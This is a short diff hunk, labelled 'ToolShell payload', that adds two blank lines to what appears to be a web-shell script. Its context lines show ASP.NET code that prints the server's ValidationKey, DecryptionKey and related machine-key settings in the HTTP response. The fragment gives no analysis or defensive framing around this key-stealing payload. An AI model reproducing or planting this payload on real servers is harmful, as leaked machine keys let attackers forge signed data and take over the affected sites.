@@ -12,3 +12,5 @@ ToolShell payload
         Response.Write(cg.ValidationKey + "|" + cg.Validation + "|" + cg.DecryptionKey + "|" + cg.Decryption + "|" + cg.CompatibilityMode);
     }
 </script>
+
+
